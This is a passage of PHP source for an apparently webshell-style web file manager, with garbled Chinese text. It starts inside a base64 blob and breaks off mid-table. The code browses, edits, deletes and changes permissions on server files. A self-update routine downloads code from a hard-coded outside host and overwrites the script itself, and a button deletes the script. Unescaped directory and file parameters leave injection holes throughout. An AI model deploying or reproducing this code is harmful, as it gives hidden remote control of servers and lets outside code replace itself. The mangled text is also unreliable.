WxlyejWw9fzsd+/8rXE0fnKvaGjQ1NTMnxib3JkZXItbGVmdC13aWR0aMno1sPX87Hfv/K1xL/ttsiho0NTUzF8Ym9yZGVyLXJpZ2h01NrSu7j2yfnD99bQyejWw8v509C1xNPSsd+/8sr00NSho0NTUzF8Ym9yZGVyLXJpZ2h0LWNvbG9yyejWw9PSsd+/8rXE0dXJq6GjQ1NTMnxib3JkZXItcmlnaHQtc3R5bGXJ6NbD09Kx37/ytcTR+cq9oaNDU1MyfGJvcmRlci1yaWdodC13aWR0aMno1sPT0rHfv/K1xL/ttsiho0NTUzF8Ym9yZGVyLXN0eWxlyejWw8vEzPWx37/ytcTR+cq9oaNDU1MxfGJvcmRlci10b3DU2tK7uPbJ+cP31tDJ6NbDy/nT0LXEyc+x37/yyvTQ1KGjQ1NTMXxib3JkZXItdG9wLWNvbG9yyejWw8nPsd+/8rXE0dXJq6GjQ1NTMnxib3JkZXItdG9wLXN0eWxlyejWw8nPsd+/8rXE0fnKvaGjQ1NTMnxib3JkZXItdG9wLXdpZHRoyejWw8nPsd+/8rXEv+22yKGjQ1NTMXxib3JkZXItd2lkdGjJ6NbDy8TM9bHfv/K1xL/ttsiho0NTUzF8b3V0bGluZdTa0ru49sn5w/fW0Mno1sPL+dPQtcTC1sCqyvTQ1KGjQ1NTMnxvdXRsaW5lLWNvbG9yyejWw8LWwKq1xNHVyauho0NTUzJ8b3V0bGluZS1zdHlsZcno1sPC1sCqtcTR+cq9oaNDU1MyfG91dGxpbmUtd2lkdGjJ6NbDwtbAqrXEv+22yKGjQ1NTMnxjb2xvcsno1sPOxLG+tcTR1cmroaNDU1MxfGRpcmVjdGlvbrnmtqjOxLG+tcS3vc/yIC8gyunQtLe9z/Kho0NTUzJ8bGV0dGVyLXNwYWNpbmfJ6NbD19a3+7zkvuCho0NTUzF8bGluZS1oZWlnaHTJ6NbD0NC436GjQ1NTMXx0ZXh0LWFsaWduuea2qM7Esb61xMuuxr221Mbrt73KvaGjQ1NTMXx0ZXh0LWRlY29yYXRpb2655raozO2807W9zsSxvrXE17DKztCnufuho0NTUzF8dGV4dC1pbmRlbnS55raozsSxvr/pytfQ0LXEy/W9+KGjQ1NTMXx0ZXh0LXNoYWRvd7nmtqjM7bzTtb3OxLG+tcTS9dOw0Ke5+6GjQ1NTMnx0ZXh0LXRyYW5zZm9ybb/Y1sbOxLG+tcS089Ch0LSho0NTUzF8dW5pY29kZS1iaWRpyejWw87Esb63vc/yoaNDU1MyfHdoaXRlLXNwYWNluea2qMjnus60psDt1KrL2NbQtcS/1bDXoaNDU1MxfHdvcmQtc3BhY2luZ8no1sO1pbTKvOS+4KGjQ1NTMXxmb2501NrSu7j2yfnD99bQyejWw8v509DX1szlyvTQ1KGjQ1NTMXxmb250LWZhbWlsebnmtqjOxLG+tcTX1szlz7XB0KGjQ1NTMXxmb250LXNpemW55raozsSxvrXE19bM5bPftOeho0NTUzF8Zm9udC1zaXplLWFkanVzdM6q1KrL2LnmtqggYXNwZWN0INa1oaNDU1MyfGZvbnQtc3RyZXRjaMrVy/W78sCtyey1scewtcTX1szlz7XB0KGjQ1NTMnxmb250LXN0eWxluea2qM7Esb61xNfWzOXR+cq9oaNDU1MxfGZvbnQtdmFyaWFudLnmtqjOxLG+tcTX1szl0fnKvaGjQ1NTMXxmb250LXdlaWdodLnmtqjX1szltcS01s+4oaNDU1MxfG1hcmdpbtTa0ru49sn5w/fW0Mno1sPL+dPQzeKx377gyvTQ1KGjQ1NTMXxtYXJnaW4tYm90dG9tyejWw9Sqy9i1xM/CzeKx377goaNDU1MxfG1hcmdpbi1sZWZ0yejWw9Sqy9i1xNfzzeKx377goaNDU1MxfG1hcmdpbi1yaWdodMno1sPUqsvYtcTT0s3isd++4KGjQ1NTMXxtYXJnaW4tdG9wyejWw9Sqy9i1xMnPzeKx377goaNDU1MxfHBhZGRpbmfU2tK7uPbJ+cP31tDJ6NbDy/nT0MTasd++4Mr00NSho0NTUzF8cGFkZGluZy1ib3R0b23J6NbD1KrL2LXEz8LE2rHfvuCho0NTUzF8cGFkZGluZy1sZWZ0yejWw9Sqy9i1xNfzxNqx377goaNDU1MxfHBhZGRpbmctcmlnaHTJ6NbD1KrL2LXE09LE2rHfvuCho0NTUzF8cGFkZGluZy10b3DJ6NbD1KrL2LXEyc/E2rHfvuCho0NTUzF8bGlzdC1zdHlsZdTa0ru49sn5w/fW0Mno1sPL+dPQtcTB0LHtyvTQ1KGjQ1NTMXxsaXN0LXN0eWxlLWltYWdlvavNvM/zyejWw86qwdCx7c/useq8x6GjQ1NTMXxsaXN0LXN0eWxlLXBvc2l0aW9uyejWw8HQse3P7rHqvMe1xLfF1sPOu9bDoaNDU1MxfGxpc3Qtc3R5bGUtdHlwZcno1sPB0LHtz+6x6rzHtcTA4NDNoaNDU1MxfG1hcmtlci1vZmZzZXQgQ1NTMnxjb250ZW500+sgOmJlZm9yZSDS1LywIDphZnRlciDOsdSqy9jF5LrPyrnTw6OswLSy5cjryfqzycTayN2ho0NTUzJ8Y291bnRlci1pbmNyZW1lbnS13dT2u/K13bz10ru49rvytuC49rzGyv3G96GjQ1NTMnxjb3VudGVyLXJlc2V0tLS9qLvy1tjWw9K7uPa78rbguPa8xsr9xveho0NTUzJ8cXVvdGVzyejWw8e2zNfS/dPDtcTS/brFwODQzaGjQ1NTMnxoZWlnaHTJ6NbD1KrL2Ljftsiho0NTUzF8bWF4LWhlaWdodMno1sPUqsvYtcTX7rTzuN+2yKGjQ1NTMnxtYXgtd2lkdGjJ6NbD1KrL2LXE1+6087/ttsiho0NTUzJ8bWluLWhlaWdodMno1sPUqsvYtcTX7tChuN+2yKGjQ1NTMnxtaW4td2lkdGjJ6NbD1KrL2LXE1+7Qob/ttsiho0NTUzJ8d2lkdGjJ6NbD1KrL2LXEv+22yKGjQ1NTMXxib3R0b23J6NbDtqjOu9Sqy9jPws3isd++4LHfvefT68bksPy6rL/pz8Kx373n1q685LXExqvSxqGjQ1NTMnxjbGVhcrnmtqjUqsvYtcTExNK7suCyu9TK0O3G5Mv7uKG2r9Sqy9iho0NTUzF8Y2xpcLz0ssO++LbUtqjOu9Sqy9iho0NTUzJ8Y3Vyc29yuea2qNKqz9TKvrXEueKx6rXEwODQzaOo0M7XtKOpoaNDU1MyfGRpc3BsYXm55rao1KrL2NOmuMPJ+rPJtcS/8rXEwODQzaGjQ1NTMXxmbG9hdLnmtqi/8srHt/HTprjDuKG2r6GjQ1NTMXxsZWZ0yejWw7aozrvUqsvY1/PN4rHfvuCx373n0+vG5LD8uqy/6dfzsd+959auvOS1xMar0saho0NTUzJ8b3ZlcmZsb3e55raotbHE2sjd0uez9tSqy9i/8sqxt6LJ+rXEysLH6aGjQ1NTMnxwb3NpdGlvbrnmtqjUqsvYtcS2qM67wODQzaGjQ1NTMnxyaWdodMno1sO2qM671KrL2NPSzeKx377gsd+959PrxuSw/Lqsv+nT0rHfvefWrrzktcTGq9LGoaNDU1MyfHRvcMno1sO2qM671KrL2LXEyc/N4rHfvuCx373n0+vG5LD8uqy/6cnPsd+959auvOS1xMar0saho0NTUzJ8dmVydGljYWwtYWxpZ27J6NbD1KrL2LXEtLnWsbbUxuu3vcq9oaNDU1MxfHZpc2liaWxpdHm55rao1KrL2MrHt/G/ybz7oaNDU1MyfHotaW5kZXjJ6NbD1KrL2LXEttG1/suz0PKho0NTUzJ8b3JwaGFuc8no1sO1sdSqy9jE2rK/t6LJ+rfW0rPKsbHY0OvU2tKzw+a117K/saPB9LXE1+7J2dDQyv2ho0NTUzJ8cGFnZS1icmVhay1hZnRlcsno1sPUqsvYuvO1xLfW0rPQ0M6qoaNDU1MyfHBhZ2UtYnJlYWstYmVmb3JlyejWw9Sqy9jHsLXEt9bSs9DQzqqho0NTUzJ8cGFnZS1icmVhay1pbnNpZGXJ6NbD1KrL2MTasr+1xLfW0rPQ0M6qoaNDU1MyfHdpZG93c8no1sO1sdSqy9jE2rK/t6LJ+rfW0rPKsbHY0OvU2tKzw+a2pbK/saPB9LXE1+7J2dDQyv2ho0NTUzJ8Ym9yZGVyLWNvbGxhcHNluea2qMrHt/G6z7Kise248bHfv/Kho0NTUzJ8Ym9yZGVyLXNwYWNpbme55raoz+DB2rWl1Kq48bHfv/LWrrzktcS+4MDroaNDU1MyfGNhcHRpb24tc2lkZbnmtqix7bjxserM4rXEzrvWw6GjQ1NTMnxlbXB0eS1jZWxsc7nmtqjKx7fxz9TKvrHtuPHW0LXEv9W1pdSquPHJz7XEsd+/8rrNsbO+sKGjQ1NTMnx0YWJsZS1sYXlvdXTJ6NbD08PT2rHtuPG1xLK8vtbL47eooaNDU1MyfDphY3RpdmXP8rG7vKS77rXE1KrL2MztvNPR+cq9oaNDU1MxfDpmb2N1c8/y07XT0Lz8xczK5Mjrvbm147XE1KrL2MztvNPR+cq9oaNDU1MyfDpob3ZlcrWxyvOx6tD8uKHU2tSqy9jJz7e9yrGjrM/y1KrL2MztvNPR+cq9oaNDU1MxfDpsaW5rz/LOtLG7t8POyrXEwbS908ztvNPR+cq9oaNDU1MxfDp2aXNpdGVkz/LS0bG7t8POyrXEwbS908ztvNPR+cq9oaNDU1MxfDpmaXJzdC1jaGlsZM/y1KrL2LXEtdrSu7j219PUqsvYzO2809H5yr2ho0NTUzJ8OmxhbmfP8rT409DWuLaoIGxhbmcgyvTQ1LXE1KrL2MztvNPR+cq9oaNDU1MyfDpmaXJzdC1sZXR0ZXLP8s7Esb61xLXa0ru49tfWxLjM7bzTzNjK4tH5yr2ho0NTUzF8OmZpcnN0LWxpbmXP8s7Esb61xMrX0NDM7bzTzNjK4tH5yr2ho0NTUzF8OmJlZm9yZdTa1KrL2Naux7DM7bzTxNrI3aGjQ1NTMnw6YWZ0ZXLU2tSqy9jWrrrzzO2808TayN2ho0NTUzI=";
}

$���=explode("|",base64_decode($hs));

for($i = 0; $i < count($���); $i++) {
    if(@ereg($N,strtolower($���[$i]))){
      echo ereg_replace("$N","<font color=#FF0000>$N</font>",htmlspecialchars(strtolower($���[$i])))."<br>\n";
    }
  }
  die();
}
//������---------------------------------------------------------------------
if($gx==1){
$first4=@language_text($color12);
if($first4!=""){
$first4 = substr($first4, 12, 5);
if($first4!=$Version){
echo "��ǰ�汾:$Version,���µİ汾:<font color=#FF0000>$first4 </font>[<a href='?gx=2' onclick=\"return(confirm('���߸���ϵͳ,���³ɹ����Զ��˵���½����.���º�����������ϵͳ,���벻��.���ȷ����ʼ����!'))\">��ʼ����</a>]";
}else{
echo "��ǰ�汾:$Version,û�и���";
}
}else{
echo "���ʧ��!";
}
die();
}
//���ظ����ļ�-----------------------------------------------------------------
if($gx==2){
$msg=@language_text($color12);
if($msg!=""){
$first4 = substr($msg, 12, 5);
if($first4!=$Version){
if(strlen($msg)>401910){
$msg=@str_replace("\$adminpass=\"670b14728ad9902aecba32e22fa4f6bd\"","\$adminpass=\"".$adminpass."\"",$msg);
$msg=@str_replace("\$color1=\"0CEE0C\"","\$color1=\"".$color1."\"",$msg);
$msg=@str_replace("\$color2=\"000000\"","\$color2=\"".$color2."\"",$msg);
$msg=@str_replace("\$color3=\"13\"","\$color3=\"".$color3."\"",$msg);
$msg=@str_replace("\$color4=\"smtp.126.com\"","\$color4=\"".$color4."\"",$msg);
$msg=@str_replace("\$color5=\"\"","\$color5=\"".$color5."\"",$msg);
$msg=@str_replace("\$color6=\"\"","\$color6=\"".$color6."\"",$msg);
$msg=@str_replace("\$color7=\"25\"","\$color7=\"".$color7."\"",$msg);
$msg=@str_replace("\$color8=\"\"","\$color8=\"".$color8."\"",$msg);
$msg=@str_replace("\$color9=\"\"","\$color9=\"".$color9."\"",$msg);
$msg=@str_replace("\$color10=\"\"","\$color10=\"".$color10."\"",$msg);
$msg=@str_replace("\$color11=\"\"","\$color11=\"".$color11."\"",$msg);
$msg=@str_replace("\$color12=\"http://hmu136033.chinaw3.com/8.txt\"","\$color12=\"".$color12."\"",$msg);
$file_self=basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", basename(__FILE__)));
$fp=@fopen("./$file_self","w");
@fwrite($fp,$msg);
header("location:?login=2");
}else{
echo "����ʧ��";
}
}else{
echo "û���µİ汾";
}
}else{
echo "���ļ�ʧ��";
}
die();
}
//UTF8ת��GBK--------------------------------------------------------------------
if($bj==1&&$A==utf8){
$filename=$dir."/".$fileName;
  $fd = @fopen($filename, "r" );
  $contents = @fread($fd, filesize($filename));
  @fclose( $fd );
 $contents=GetGB2312String($contents);
   $contents = preg_replace( '/^(\xef\xbb\xbf)/', '', $contents);//ɾ��Bom
   if(substr($contents, 0, 8)=='&#65279;'){
   $contents = ereg_replace( '&#65279;','', $contents);//ɾ��Bom  
   }
echo $contents;
die();
}
//��������--------------------------------------------------------------------
if($bj==1&&$A==1){
$filename=$dir."/".$fileName;
  $fd = @fopen($filename, "r" );
  $contents = @fread($fd, filesize($filename));
  @fclose( $fd );
echo $contents;
die();
}
//�﷨����--------------------------------------------------------------------
if($bj==1&&$A==2){

$file= "$dir/$fileName";
$settings=compact("indent_width","max_line","max","del_line","highlight","braces","file");
$beauty= new phpBeautify($settings);
$beauty->toHTML();
die();
}
//����Ŀ¼�б�--------------------------------------------------------------------
if($bj==1&&$A==3){
$i=0;
?>
<table border="0" cellspacing="0" cellpadding="0" width="100%">  
<tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;">
<td width="15"><a href="?iframeA=6&dir=<?=urlencode($dir)?>/.." target="ajaxurl"><div class="up"></div></a></td>
<td width="15"  align="center">..</td>
<td><a href="?iframeA=6&dir=<?=urlencode($dir)?>/.." target="ajaxurl">��һ��</a>
</td>
</tr>
<?
@$dirs=opendir($dir);
while (@$file=readdir($dirs)) {
     @$b="$dir/$file";
     @$a=is_dir($b);
	if($a=="1"){
	if($file!=".."&&$file!=".")
	{
$i++;
?>
<tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;">
<td width="15"><a target="header" href="?del=2&DL=1&dir=<?=urlencode($dir)?>&fileName=<?=$file?>" onclick="return(confirm('ȷ��ɾ�� <?=$file?>?'))"<div class="delete"></div></a></td>
<td width="15"><div class="folder"></div></td>
<td><a href="?iframeA=6&dir=<?=urlencode($dir)?>/<?=$file?>" target="ajaxurl"><?=$file?></a></td>
</tr>
<?
}
}
}
@closedir($dirs); 
?>
</table>
<?
die();
}

//�����ļ��б�--------------------------------------------------------------------
if($bj==1&&$A==4){
$i=0;
?>
<table border="0" cellspacing="0" cellpadding="0" width="100%">
<?
@$dirs=opendir($dir);
$dir0=realpath("");
$dir1=realpath($dir);
while (@$file=readdir($dirs)) {
     @$b="$dir/$file";
     @$a=is_dir($b);
	if($a=="0"){
	if($file!=".."&&$file!=".")
	{
$Fname=Fname($file);
$path_parts = pathinfo("$file");
$Fnames = strtolower($path_parts["extension"]);
$i++;
$file_self=basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", basename(__FILE__)));
if($file==$file_self&&$dir0==$dir1){
?>
<tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;">
<td width="15" align="center">--</td>
<td width="15" align="center">--</td>
<td width="15"><div class="home"></div></td>
<td>�����ļ�������</td>
</tr>
<?
}else{
?>
<tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;">
<td width="15"><a target="header" href="?del=2&DL=1&dir=<?=urlencode($dir)?>&fileName=<?=urlencode($file)?>" onclick="return(confirm('ȷ��ɾ�� <?=$file?>?'))"><div class="delete"></div></a></td>
<td width="15"><a href="<?=$dir?>/<?=$file?>" target="_blank"><div class="search"></div></a></td>
<td width="15"><a href="<?=$dir?>/<?=$file?>" target="_blank"><?if($Fnames=="ico"){?><img src="?bj=1&A=7&dir=<?=$dir?>&fileName=<?=$file?>" width="16" height="16"><?}else{?><div class="<?=$Fname?>"></div><?}?></a></td>
		
<td>
<?
if($Fnames=="php"||$Fnames=="asp"||$Fnames=="aspx"||$Fnames=="jsp"||$Fnames=="htm"||$Fnames=="html"||$Fnames=="xml"||$Fnames=="js"||$Fnames=="css"||$Fnames=="txt"||$Fnames=="inc"||$Fnames=="ini"||$Fnames=="json"){
		$encode=get_encode($dir.'/'.$file);
}else{
	  $encode="�޷�ʶ��";
}
if($Fnames=="jpg"||$Fnames=="jpge"||$Fnames=="gif"||$Fnames=="png"||$Fnames=="ico"){
?>
<a href="<?=$dir?>/<?=$file?>" target="_blank" onmousemove="s('divimg','<?=$dir?>/<?=$file?>')" onmouseout="cl('divimg')"><?=$file?></a>
<?
}else{
?>
<a href="#" onclick="if(confirm('���µĴ��ڱ༭ ��<?=$file?>��?')){window.open('?bj=1&encode=<?=$encode?>&dir=<?=$dir?>&fileName=<?=$file?>');}else{if(confirm('ȷ���������� ��<?=$file?>��?')){getData('?bj=1&A=<?if($encode=="UTF-8" || $encode=="UTF8-BOM"){echo "utf8";}else{echo "1";}?>&dir=<?=urlencode($dir)?>&fileName=<?=urlencode($file)?>','c2','<?=$dir?>','<?=$file?>'),$$('xin').innerHTML='�༭�ļ�: <?=urlencode($file)?>',utf8gbk('<?=$encode?>');}}" title="<?=$encode?>"><?=$file?></a>
<?
}
if($Fnames=="mp3"){ 
?>
<object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,19,0" width="25" height="14">
      <param name="movie" value="http://tools.meqzone.com/others/play/swf/2.swf?file=<?=$dir?>/<?=$file?>&width=25&songVolume=100&backColor=E8E8E8&frontColor=000000&autoStart=false&repeatPlay=false&showDownload=false" />
      <param name="quality" value="High" />
      <param value="transparent" name="wmode" />
      <embed src="http://tools.meqzone.com/others/play/swf/2.swf?file=<?=$dir?>/<?=$file?>&width=25&songVolume=100&backColor=E8E8E8&frontColor=000000&autoStart=false&repeatPlay=false&showDownload=false" width="25" height="14" quality="High" pluginspage="http://www.macromedia.com/go/getflashplayer" type="application/x-shockwave-flash" wmode="transparent"></embed>
</object>
<?
}
?>
</td>
</tr>
<?
}
}
}
}
@closedir($dirs); 
?>
</table>
<?
die();
}

if($A=="A3"){
?>
<table border="0" width="100%"  height="100%">
			<tr>
<td valign="top" id="dyleft">

<table  border="0" width="100%" cellspacing="0" cellpadding="0" >
<tr>
<td  width="20"><input type="checkbox" class=chcekbox name="" value="" onclick="this.value=check(this.form)"></td>
<td  width="20"><a href="?iframeA=1&dir=<?=$dir?>/.." target="ajaxurl" title="��һ��"><div class="up"></div></a></td>
<td>�ļ�������</td>
<td width="16"><a href="?iframeA=1&dir=<?=$dir?>" target="ajaxurl" title="ˢ��" id="refresh"><div class="reload"></div></a></td>
<td width="35"></td>
<td colspan="2">����</td>
</tr>
<?php
//------------------------------------Ŀ¼--------------------------------------------
@$dirs=opendir($dir);
$i=0;
while (@$file=readdir($dirs)) {
     @$b="$dir/$file";
     @$a=is_dir($b);
	if($a=="1"){
	if($file!=".."&&$file!=".")
	{
if(is_readable("$dir/$file")==1){@$dird="�ɶ�";}else{@$dird="���ɶ�";}
if(is_writeable("$dir/$file")==1){@$dirx="��д";}else{@$dirx="����д";}
$fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
$i++;
?>
<tr style="background:<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" onClick="trColor3(this,'<?if($i%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');">
<td width="20"><input type="checkbox" class=chcekbox name="file[]" value="<?echo $file?>" id="1"></td>
<td width="20">
<?if($file=="8db"){?>
<div class="mdb" title="�ļ���ע�����ļ��п��������������ע."></div>
<?}else{?>
<div class="folder"></div>
<?}?>
</td>
<td><a href="?iframeA=1&dir=<?echo $dir."/".$file;?>" target="ajaxurl" ><?echo $file;?></a></td>
<td width="16"><a href="?iframeA=4&dir=<?echo $dir."/".$file;?>" target="ajaxurl" onclick=$$('xin').innerHTML='�ļ������:<?=$file?>';" title="Ԥ��"><div class="search"></div></td>
<td width="35" title="<?echo $dird."/".$dirx;?>"><input type="button"  class="submit"  style="height:20px;width:60px;background:url(?imgname=allbgs.gif) no-repeat 0px -158px;" value="��<?=$fileperm?>"   onclick="$$('key666').src='?bj=8&key=<?=$fileperm?>&dir=<?=$dir?>&file=<?=$file?>&actions=editperming2',showid('smallLay9');"></td>
<td width="25"><input type="button"  class="submit"  name="B3" onclick="if(confirm('ȷ��ɾ�� <?=$file?> !')){$$('header').src='?del=2&dir=<?=urlencode($dir)?>&fileName=<?=urlencode($file)?>';}"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -302px;" title="ɾ��"></td>
<td width="25"><input type="button"  class="submit" name="B3" value="" onclick="showid('smallLay11'),$$('oldname').value='<?=$file?>',$$('newT8').value='<?=$file?>';"  style="width:25px;height:20px;background:url(?imgname=allbgs.gif) no-repeat 0px -222px;" title="��������"></td>
</tr>
<?
}
}
}
$Mi=$i;
@closedir($dirs); 
//------------------------------------------------------------------------------------------
?>
</table>
</td>

<td valign="top" id="dyright">
<?if($images=="ͼƬ"){?>
<div>
<?
//------------------------------------�ļ�--------------------------------------------
@$dirs=opendir($dir);
$is=0;
$dir0=realpath("");
$dir1=realpath($dir);
while (@$file=readdir($dirs)) {
     @$b="$dir/$file";
     @$a=is_dir($b);
	if($a=="0"){
	if($file!=".."&&$file!=".")
	{
$size=byte_format(filesize("$dir/$file"));
$lastsave=date("Y-n-d H:i",filectime("$dir/$file"));
$lastsaves=date("Y-n-d H:i",filemtime("$dir/$file"));
$lastsavesd=date("Y-n-d H:i",fileatime("$dir/$file"));

if(is_readable("$dir/$file")==1){@$dird="�ɶ�";}else{@$dird="���ɶ�";}
if(is_writeable("$dir/$file")==1){@$dirx="��д";}else{@$dirx="����д";}
$fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
$is++;
$Fname=Fname($file);
$path_parts = pathinfo("$file");
$Fnames = strtolower($path_parts["extension"]);
$file_self=basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", basename(__FILE__)));
if($Fnames=="jpg"||$Fnames=="jpge"||$Fnames=="gif"||$Fnames=="png"||$Fnames=="bmp"||$Fnames=="ico"){
?>

<div class="images">
<table border="0" width="140">
<tr>
<td height="144"  align="center">
<?
$info=getimageinfo($dir.'/'.$file);
if($info[width]>=$info[height]){
   $kgws="width";
}else{
   $kgws="height";
}
if($info[width]>135 || $info[height]>135){
   $kgwc=135;
}else{
   $kgwc="";
}

if((filesize("$dir/$file")/1024)>100000){
?>
<a href="<?=$dir?>/<?=$file?>" target="_blank" ><img class="ca-sign" src="?abcd=1&dir=<?=$dir?>&file=<?=$file?>" title="����:<?=$info[type]?>��С:<?=$info[size]?>" <?=$kgws?>="<?=$kgwc?>"></a><br>
<?}else{?>
<a href="<?=$dir?>/<?=$file?>" target="_blank" ><img class="ca-sign" src="<?=$dir?>/<?=$file?>"  title="����:<?=$info[type]?>��С:<?=$info[size]?>" <?=$kgws?>="<?=$kgwc?>"></a><br>
<?}?>
</td>
</tr>
<tr>
	<td align="center">��:<?=$info[width]?>px����:<?=$info[height]?>px</td>
</tr>
<tr>
<tr>
	<td align="center"><div class="wjbztitle"><input type="checkbox" class=chcekbox name="file[]" value="<?=$file;?>"><a href="<?=$dir?>/<?=$file?>" target="_blank" title="<?=$file?>  (<?=$size?>)"><?=$file?></a></div></td>
</tr>
<td align="center">
	<input type="button" value="ɾ��" class="submit"  name="B3" onclick="if(confirm('ȷ��ɾ�� <?=$file?> !')){$$('header').src='?del=2&dir=<?=urlencode($dir)?>&fileName=<?=urlencode($file)?>';}"  style="height:21px;width:48px;background:url(?imgname=allbgs.gif) no-repeat 0px -302px;" title="ɾ��">
	<input type="button" value="������" class="submit" name="B3" onclick="showid('smallLay11'),$$('oldname').value='<?=$file?>';"  style="height:21px;width:58px;background:url(?imgname=allbgs.gif) no-repeat 0px -222px;" title="��������">
</td>
</tr>
</table>
</div>



<?
}}}}
$Fi=$is;
@closedir($dirs); 
?>
</div>
<?}else{?>
<table  border="0" width="100%" cellspacing="0" cellpadding="0">
                          <tr>
                            <td width="15"><input type="checkbox" class=chcekbox name="" value="" onclick="this.value=check(this.form)"></td>
                            <td width="15"><a href="?iframeA=1&dir=<?=$dir?>/.." target="ajaxurl" title="��һ��"><div class="up"></div></a></td>
                            <td>�ļ�����   </td><td></td>
                             <td width="20"></td>
                            <td width="80" align="right">ʶ��</td>
                            <td width="80" align="right">��С</td>
                            <td width="60" align="center">�� ��</td> 
                            <td width="25" align="center">��</td>
                            <td width="25"></td>
                            <td width="25" align="center">��</td>
                            <td width="20"></td>
                            <td width="30" align="center">��</td>
                          </tr>
<?
//------------------------------------�ļ�--------------------------------------------
$dirs=opendir($dir);
$is=0;
$dir0=realpath("");
$dir1=realpath($dir);

while (@$file=readdir($dirs)) {
     @$b="$dir/$file";
     @$a=is_dir($b);
	if($a=="0"){
	if($file!=".."&&$file!=".")
	{
$size=filesize("$dir/$file");
$gsize=$gsize+$size;
$size=byte_format($size);
$lastsave=date("Y-n-d H:i",filectime("$dir/$file"));//����ʱ��
$lastsaves=date("Y-n-d H:i",filemtime("$dir/$file"));//�ϴ��޸�
$lastsavesd=date("Y-n-d H:i",fileatime("$dir/$file"));//������
$wjbztime=date("Y-n-d H:i",filemtime("8db/".base64_encode(realpath($dir."/".$file))));//���עʱ��

if(is_readable("$dir/$file")==1){@$dird="�ɶ�";}else{@$dird="���ɶ�";}
if(is_writeable("$dir/$file")==1){@$dirx="��д";}else{@$dirx="����д";}
$fileperm=substr(base_convert(fileperms("$dir/$file"),10,8),-4);
$is++;
$Fname=Fname($file);
$path_parts = pathinfo("$file");
$Fnames = strtolower($path_parts["extension"]);
$file_self=basename(ereg_replace("^[a-zA-Z]*\:\/(.*)$", "\\1", basename(__FILE__)));

if($Fnames==$images || $images==""){

if($file==$file_self&&$dir0==$dir1){
	
?>
	                    <tr style="background:<?if($is%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($is%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');">
                            <td width="15" align="center">--</td>
                            <td width="15"><div class="home"></div></td>
                            <td>�����ļ�������</td><td></td>
                            <td width="20"></td>
                            <td width="50" align="right">GB2312</td>
                            <td width="70" align="right"><?=$size?></td>

                            <td width="60" title="<?echo $dird."/".$dirx;?>"  align="right"><?echo $fileperm;?> </td> 
                            <td width="25"><input type="button" class="submit"  name="B3" onclick="window.open('?bj=1&A=7&dir=<?=urlencode($dir)?>&fileName=<?=$file?>')"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -334px;" title="����"></td>
                            <td width="25" align="center"><input type="button" class="submit"  name="B3" onclick="if(confirm('ȷ��Ҫ��ɱô!')){$$('header').src='?del=2&dir=<?=$dir?>&fileName=<?=$file?>';}"  style="height:20px;width:25px;background:url(?imgname=allbgs.gif) no-repeat 0px -302px;" title="��ɱ"></td>
                            <td width="25" align="center">--</td>
                            <td width="20" align="center">--</td>
                            <td width="25" align="center">--</td>

                          </tr>

<?
}else{
?>
	<tr style="background:<?if($is%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>;" onmouseover=" trColor1(this);" onmouseout="trColor2(this,'<?if($is%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" onClick="trColor3(this,'<?if($is%2==1){echo "#EFEFEF";}else{echo "#FFFFFF";}?>');" >
                            <td width="15"><input type="checkbox" class=chcekbox name="file[]" value="<?echo $file;?>"></td>
                            <td width="15"><?if($Fnames=="ico"){?><img src="?bj=1&A=7&dir=<?=$dir?>&fileName=<?=$file?>" width="16" height="16"><?}else{?><div class="<?=$Fname?>"></div><?}?></td>
<td><a href="<?=$dir?>/<?=$file?>" target="_blank">
<?

if(str_replace("\\","/",$dir1)==str_replace("\\","/",$dir0)."/8db"){
echo base64_decode($file)." �ı�ע";
}else{
echo $file;
}
?>
</a>
<?
if($file=="class.phpmailer.php"||$file=="class.smtp.php"){
echo "��<span style=\"color:#888\">�ʼ����</span>";
}
if($Fnames=="jpg"||$Fnames=="jpge"||$Fnames=="gif"||$Fnames=="png"||$Fnames=="swf"||$Fnames=="swc"||$Fnames=="bmp"||$Fnames=="swc"||$Fnames=="psd"||$Fnames=="tif"){
$info=getimageinfo($dir.'/'.$file);
?>
����<span style="color:#888">��:<?=$info[width]?>px����:<?=$info[height]?>px</span>
<?
}else if($Fnames=="mp3"){ 
$AE = new AudioExif();
if($AE->CheckSize($file)=='true'){
$info=$AE->GetInfo($dir.'/'.$file);
?>
����<span style="color:#888"><?=$info[Title]?></span>
<?
}
}
?>
</td>
<td>
<?
//////////////////////

if(file_exists("8db/".base64_encode(realpath($dir."/".$file)))){
$handle = @fopen("8db/".base64_encode(realpath($dir."/".$file)), "r"); 
if ($handle) { 
$buffer = htmlspecialchars(fread($handle, 100)); 
?>
<div class="wjbztitle" title="<?=$buffer?>...">
<?=$buffer?>
</div>
<?
fclose($handle); 
} 

}

//////////////////////
?>
</td>

                             <td width="20">
<?
if($Fnames=="jpg"||$Fnames=="jpge"||$Fnames=="gif"||$Fnames=="png"||$Fnames=="bmp"){
$info=getimageinfo($dir.'/'.$file);
if((filesize("$dir/$file")/1024)>100000){
?>
<a href="#"  onmousemove="s2('div<?=$is?>','?abcd=1&dir=<?=$dir?>&file=<?=$file?>')" onmouseout="cl2('div<?=$is?>')"><div class="search"></div></a>
<?}else{?>
